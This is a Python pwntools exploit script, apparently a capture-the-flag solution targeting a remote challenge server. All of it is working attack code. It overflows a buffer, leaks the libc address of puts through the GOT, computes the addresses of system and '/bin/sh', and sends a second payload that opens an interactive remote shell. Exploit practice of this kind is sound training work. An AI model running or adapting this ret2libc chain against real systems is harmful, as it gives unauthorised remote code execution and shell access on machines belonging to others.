from pwn import *

context.binary = './server'
exe = ELF('./server')
#io = process()
#gdb.attach(io, api=True)
io = remote("thekidofarcrania.com", 4902)

#Gadgets:
pad = b'a'*60
pop_edi_pop_ebp = 0x080488ea
pop_ebx = 0x080483c9
ret = 0x080483b2

#Exploits:
#Leak address:
payload = pad + p32(exe.plt['puts']) + p32(exe.symbols['vuln']) + p32(exe.got['puts'])
io.recvuntil(b'text: ')
io.sendline(payload)
io.recvuntil(b'Return address: ')
io.recvline()
io.recvline()
output = u32(io.recv(4))
print("Leak puts address:")
print(hex(output))

#System go brrr:
system_addr = output - 0x2a940
binsh_addr = output + 0x11658f
payload = pad + p32(system_addr) + p32(exe.symbols['main']) + p32(binsh_addr)
io.sendline(payload)

io.interactive()